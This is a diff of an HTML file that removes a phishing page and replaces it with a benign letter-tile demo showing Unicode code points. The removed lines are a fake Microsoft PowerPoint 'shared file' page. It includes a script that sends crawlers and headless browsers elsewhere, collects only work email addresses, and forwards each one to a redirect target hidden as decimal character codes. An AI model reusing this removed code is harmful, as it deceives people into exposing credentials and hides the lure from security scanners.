@@ -2,122 +2,238 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/svg" href="https://upload.wikimedia.org/wikipedia/commons/0/0d/Microsoft_Office_PowerPoint_%282019%E2%80%93present%29.svg">
-    <title>PowerPoint</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HTML Letters</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            background-color: #f4f4f4; /* Outlook blue background */
-            color: black; 
-            margin: 0; 
-            padding: 0; 
-            min-height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: space-between; 
+        :root {
+            color-scheme: light;
+            font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
         }
-        .container { margin-top: 100px; }
-        .logo { 
-            display: block;
-            margin: 0 auto 20px auto;
-            width: 100px; /* Adjust width */
-            height: auto; /* Auto keeps aspect ratio */
-            max-width: 120px; /* Prevents excessive resizing */
+
+        * {
+            box-sizing: border-box;
         }
-        input, button { padding: 10px; margin-top: 10px; }
-        input { width: 280px; border: 1px solid #ccc; border-radius: 5px; }
-        button { background-color: #D35230; color: white; border: none; cursor: pointer; border-radius: 5px; }
-        footer { 
-            background: #f4f4f4; /* Footer matches the email form background */
-            color: black; 
-            padding: 15px; 
-            font-size: 14px; 
-            width: 100%; 
-            position: absolute; 
-            bottom: 0; 
-            text-align: center; 
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            background: radial-gradient(circle at top, #f9fafb 0%, #dbe3ff 60%, #f3f4f6 100%);
+            color: #0f172a;
         }
-        footer a { color: #fff; text-decoration: none; margin: 0 10px; }
+
+        .app {
+            width: min(960px, 100%);
+            padding: 72px clamp(24px, 4vw, 64px);
+            display: flex;
+            flex-direction: column;
+            gap: 32px;
+        }
+
+        h1 {
+            margin: 0 0 8px;
+            font-size: clamp(2.2rem, 5vw, 3.2rem);
+        }
+
+        p.lead {
+            margin: 0;
+            font-size: 1.05rem;
+            color: #475569;
+        }
+
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 16px 20px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(15, 23, 42, 0.1);
+            backdrop-filter: blur(16px);
+        }
+
+        label {
+            font-weight: 600;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+
+        input {
+            flex: 1;
+            min-width: 240px;
+            border: 1px solid #cbd5f5;
+            border-radius: 999px;
+            padding: 12px 20px;
+            font-size: 1rem;
+            background: white;
+            transition: border-color 120ms ease, box-shadow 120ms ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+        }
+
+        button {
+            border: none;
+            border-radius: 999px;
+            padding: 12px 28px;
+            font-size: 1rem;
+            font-weight: 600;
+            background: linear-gradient(135deg, #4f46e5, #7c3aed);
+            color: white;
+            cursor: pointer;
+            transition: transform 140ms ease, box-shadow 140ms ease;
+        }
+
+        button:active {
+            transform: scale(0.98);
+            box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(80px, 1fr));
+            gap: 16px;
+        }
+
+        .letter-card {
+            position: relative;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            padding: 18px;
+            min-height: 110px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 20px 40px rgba(15, 23, 42, 0.12);
+            border: 1px solid rgba(99, 102, 241, 0.15);
+            transition: transform 140ms ease, border-color 140ms ease;
+        }
+
+        .letter-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(79, 70, 229, 0.4);
+        }
+
+        .char {
+            font-size: clamp(1.8rem, 5vw, 2.6rem);
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+
+        .code {
+            font-size: 0.85rem;
+            letter-spacing: 0.1em;
+            color: #6366f1;
+            text-transform: uppercase;
+        }
+
+        .explainer {
+            font-size: 0.95rem;
+            color: #475569;
+        }
+
+        .explainer span {
+            font-weight: 600;
+            color: #312e81;
+        }
+
+        @media (max-width: 640px) {
+            .app {
+                padding-top: 40px;
+            }
+            button, input {
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- Bot Trap: Immediate Redirect -->
-    <script>
-        function isBot() {
-            const botAgents = [
-                "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "facebot", "ia_archiver", "YandexBot",
-                "curl", "wget", "python-requests", "scrapy", "PostmanRuntime", "MauiBot", "LinkPreview",
-                "HeadlessChrome", "PhantomJS", "selenium", "httpx", "httpclient", "axios", "go-http-client",
-                "MJ12bot", "SemrushBot", "rogerbot", "Baiduspider", "Bytespider", "Sogou", "Exabot", "AhrefsBot",
-                "Outlook-Express", "Microsoft URL Control", "MSIECrawler", "Trident", "CFNetwork", "Java/1.",
-                "ZohoExternalHit", "MegaIndex", "DotBot", "BLEXBot", "SEOkicks", "SerpstatBot", "DataForSeoBot",
-                "python-httpx", "Google-InspectionTool", "Google-Read-Aloud", "Google-Translate"
-            ];
-            
-            const userAgent = navigator.userAgent;
-            const isHeadless = navigator.webdriver || !(navigator.plugins.length > 0);
-            
-            return botAgents.some(bot => userAgent.includes(bot)) || isHeadless;
-        }
+    <main class="app">
+        <section>
+            <h1>Build HTML Letters</h1>
+            <p class="lead">Type any phrase to instantly render beautiful letter tiles complete with Unicode code points.</p>
+        </section>
 
-        if (isBot()) {
-            window.location.href = "https://blocked.com"; // Redirect bots immediately
-        }
-    </script>
+        <section class="controls">
+            <label class="sr-only" for="textInput">Enter letters</label>
+            <input id="textInput" type="text" maxlength="64" placeholder="Try typing 'HELLO WORLD'">
+            <button type="button" id="buildBtn">Build letters</button>
+        </section>
 
-    <!-- Outlook Authentication Page -->
-    <div id="auth-page" class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Microsoft_Office_PowerPoint_%282019%E2%80%93present%29.svg" alt="Outlook Logo" class="logo"><br>
-        
-        <p>Here's the PowerPoint file that <b>Andrew</b> shared with you.</p><br><br>
-        <input type="email" id="email" placeholder="Enter the recipient's email to proceed">
-        <button onclick="validateEmail()">Continue</button>
-    </div>
+        <p class="explainer">Only A–Z characters are rendered. Spaces show as <span>␠</span>.</p>
 
-    <!-- Footer -->
-    <footer>
-        <p>&copy; <span id="year"></span> Microsoft. All Rights Reserved.</p>
-        <p>
-            <a href="privacy-policy.html" style="color: black;">Privacy Policy</a> |
-            <a href="terms-of-use.html" style="color: black;">Terms of Use</a>
-        </p>
-    </footer>
+        <section aria-live="polite">
+            <div id="lettersGrid" class="grid" role="list"></div>
+        </section>
+    </main>
 
     <script>
-        document.getElementById("year").textContent = new Date().getFullYear();
+        const DEFAULT_TEXT = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const input = document.getElementById("textInput");
+        const buildBtn = document.getElementById("buildBtn");
+        const grid = document.getElementById("lettersGrid");
 
-        function validateEmail() {
-            let email = document.getElementById("email").value.trim();
-            let validRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const formatText = (value) =>
+            value
+                .toUpperCase()
+                .replace(/[^A-Z\s]/g, "")
+                .replace(/\s+/g, " ")
+                .trim();
 
-            if (!validRegex.test(email)) {
-                alert("Invalid email format");
-                return;
-            }
+        const getCodepoint = (char) =>
+            "U+" + char.charCodeAt(0).toString(16).toUpperCase().padStart(4, "0");
 
-            let forbiddenDomains = ["gmail.com", "yahoo.com", "aol.com", "company.com", "teste.com", "test.com", "mail.com", "email.com", "verizon.net"];
-            let emailDomain = email.split("@")[1].toLowerCase();
-            
-            if (forbiddenDomains.includes(emailDomain)) {
-                alert("Personal emails are not allowed. Use your company email.");
-                return;
-            }
+        const renderLetters = (rawValue) => {
+            const processed = rawValue || DEFAULT_TEXT;
+            grid.innerHTML = "";
 
-            let base64Email = (email);
-            let encodedURL = "104 116 116 112 115 58 47 47 121 111 117 114 112 114 111 112 45 100 97 116 97 114 111 111 109 45 112 111 119 101 114 112 111 105 110 116 45 97 99 99 101 115 115 46 115 117 98 111 100 111 114 101 114 54 46 99 111 109 47 87 54 48 73 85 98 111 78 84 105 99 100 87 105 72 71 73 81 108 72 116 114 69 70 102 104 86 81 83 89 105 81 47";
-            let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
+            [...processed].forEach((char) => {
+                const isSpace = char === " ";
+                const displayChar = isSpace ? "␠" : char;
+                const code = isSpace ? "U+2420" : getCodepoint(char);
 
-            window.location.href = decodedURL + "*" + (base64Email);
-        }
+                const tile = document.createElement("div");
+                tile.className = "letter-card";
+                tile.setAttribute("role", "listitem");
+                tile.setAttribute("aria-label", `Letter ${displayChar}, code ${code}`);
+                tile.innerHTML = `
+                    <span class="char">${displayChar}</span>
+                    <span class="code">${code}</span>
+                `;
+                grid.appendChild(tile);
+            });
+        };
 
-        // Enable "Enter" key submission for email input
-        document.getElementById("email").addEventListener("keypress", function(event) {
+        const handleUpdate = () => {
+            const cleaned = formatText(input.value);
+            renderLetters(cleaned);
+        };
+
+        buildBtn.addEventListener("click", handleUpdate);
+        input.addEventListener("input", handleUpdate);
+        input.addEventListener("keydown", (event) => {
             if (event.key === "Enter") {
-                validateEmail();
+                event.preventDefault();
+                handleUpdate();
             }
         });
+
+        renderLetters(DEFAULT_TEXT);
     </script>
 </body>
 </html>
